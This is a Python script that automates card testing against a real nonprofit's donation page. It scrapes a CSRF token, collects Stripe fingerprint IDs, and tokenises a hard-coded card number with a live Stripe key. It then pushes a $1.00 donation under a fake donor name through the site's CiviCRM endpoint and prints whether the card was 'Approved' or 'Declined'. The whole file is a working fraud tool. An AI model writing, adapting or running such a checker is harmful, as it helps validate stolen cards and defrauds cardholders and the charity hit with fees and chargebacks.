import requests

session = requests.session()

req1 = session.get('https://collectivepowerrj.org/donate-now/')
csrf = req1.text.split("csrfToken:'")[1].split("'")[0]


headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
}

reqid =  session.post('https://m.stripe.com/6', headers=headers) 

muid = reqid.json()['muid']
sid = reqid.json()['sid']
guid = reqid.json()['guid']

headers = {
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}

data = f'type=card&card[number]=4833120185449882&card[cvc]=999&card[exp_month]=03&card[exp_year]=29&billing_details[address][postal_code]=10010&guid={guid}&muid={guid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+card-element&referrer=https%3A%2F%2Fcollectivepowerrj.org&time_on_page=1458760&key=pk_live_LapaXHOCVGmqGeqBn5sm1rLO'

req1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
token_cc = req1.json()['id']

headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://collectivepowerrj.org',
    'Pragma': 'no-cache',
    'Referer': 'https://collectivepowerrj.org/donate-now/?civiwp=CiviCRM&q=civicrm%2Fcontribute%2Ftransact',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = {
    'civiwp': 'CiviCRM',
    'q': 'civicrm/ajax/api4/StripePaymentintent/ProcessPublic',
}

data = {
   'params': f'{{"paymentMethodID":"{token_cc}","amount":"1.00","currency":"USD","paymentProcessorID":"5","description":"Donate Now | Collective Power for Reproductive Justice","extraData":"aasdsadnj@gmail.com;Alex;Padilla;","csrfToken":"{csrf}","captcha":""}}'
}

req2 = session.post('https://collectivepowerrj.org/donate-now/', params=params,headers=headers, data=data)

mensaje = req2.json()['error_message']

print(f'Response: {mensaje}')

code = req2.text.split('"code":"')[1].split('","')[0] 
msg = req2.text.split('"error":"')[1].split('"}')[0]

if '"success":true' in req2.text:
    status = "Approved ✅"
elif "2001" in code or "2010" in code:
    status = "Approved ✅"
else:
    status = "Declined ❌"

print(f'Status: {status}')
